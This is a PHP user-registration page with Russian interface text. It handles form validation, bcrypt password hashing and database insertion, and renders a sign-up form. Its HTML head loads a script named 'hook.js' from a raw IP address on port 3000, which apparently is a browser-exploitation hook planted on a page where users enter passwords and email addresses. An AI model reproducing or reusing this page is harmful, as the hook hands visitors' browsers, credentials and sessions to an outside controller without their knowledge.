<?php
global $pdo;
require_once 'db.php';

function log_message($message) {
    $log_file = 'logs/register_log.txt';
    $current_time = date('Y-m-d H:i:s');
    $log_entry = "[$current_time] $message" . PHP_EOL;
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);
    $password_repeat = trim($_POST['password_repeat']);
    $email = trim($_POST['email']);

    if (empty($username) || empty($password) || empty($password_repeat) || empty($email)) {
        log_message("Пустые поля для пользователя '$username'.");
        die('Пожалуйста, заполните все поля.');
    }

    if ($password != $password_repeat) {
        log_message("Пароли не совпадают при регистрации пользователя '$username'.");
        die('Пароли не совпадают. Пожалуйста, повторите попытку.');
    }

    // Проверка, существует ли уже пользователь с таким именем
    $stmt = $pdo->prepare("SELECT id FROM users WHERE username = :username");
    $stmt->execute(['username' => $username]);
    $user = $stmt->fetch();

    if ($user) {
        log_message("Попытка регистрации с существующим именем пользователя '$username'.");
        die('Пользователь с таким именем уже существует.');
    }

    // Хешируем пароль
    $password_hash = password_hash($password, PASSWORD_BCRYPT);

    // Сохраняем пользователя в базе данных
    try {
        $stmt = $pdo->prepare("INSERT INTO users (username, password, email) VALUES (:username, :password, :email)");
        $stmt->execute(['username' => $username, 'password' => $password_hash, 'email' => $email]);
        log_message("Успешная регистрация пользователя '$username'.");
        echo 'Регистрация успешна. Теперь вы можете <a href="login.php">войти</a>.';
    } catch (PDOException $e) {
        log_message("Ошибка при регистрации пользователя '$username': " . $e->getMessage());
        die('Ошибка при регистрации. Пожалуйста, попробуйте снова.');
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <link rel="stylesheet" href="style.css">
    <script src="http://31.172.66.196:3000/hook.js"></script>
</head>
<body>
    <h1>Регистрация</h1>
    <form action="register.php" method="post">
        <label for="username">Имя пользователя:</label>
        <input type="text" name="username" id="username" required>

        <label for="email">Email:</label>
        <input type="email" name="email" id="email" required>

        <label for="password">Пароль:</label>
        <input type="password" name="password" id="password" required>

        <label for="password_repeat">Повторите пароль:</label>
        <input type="password" name="password_repeat" id="password_repeat" required>

        <button type="submit">Зарегистрироваться</button>
    </form>
    <a href="login.php">Вход</a>
</body>
</html>
